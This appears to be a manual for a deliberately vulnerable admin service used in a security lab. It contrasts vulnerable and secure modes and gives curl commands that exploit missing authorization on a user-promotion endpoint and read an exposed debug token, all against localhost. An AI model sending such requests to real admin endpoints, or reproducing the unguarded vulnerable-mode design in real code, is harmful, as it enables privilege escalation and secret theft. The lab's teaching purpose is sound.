# Admin Service Manual

## Endpoints
- `POST /admin/promote?user_id=...`
- `GET /admin/tenant`
- `GET /admin/debug`
- `GET /chain/run`

## Vulnerable vs Secure Behavior

| Area | Vulnerable Mode | Secure Mode |
|---|---|---|
| Promotion control | No middleware gate | Requires header `X-Admin: true` |
| Debug route | Exposes debug token and env details | Disabled |
| Tenant management | Returns unsafe flag for tenant controls | Returns tenant list with safer constraints |
| Attack chain signaling | Supports full attack chain walkthrough | Security controls reduce chain feasibility |

## Exploitation Examples

### Broken function-level authorization
```bash
curl -s -X POST "http://localhost:18080/admin/promote?user_id=1"
```

### Internal debug data exposure
```bash
curl -s http://localhost:18080/admin/debug
```

### Chain signal endpoint
```bash
curl -s http://localhost:18080/chain/run
```
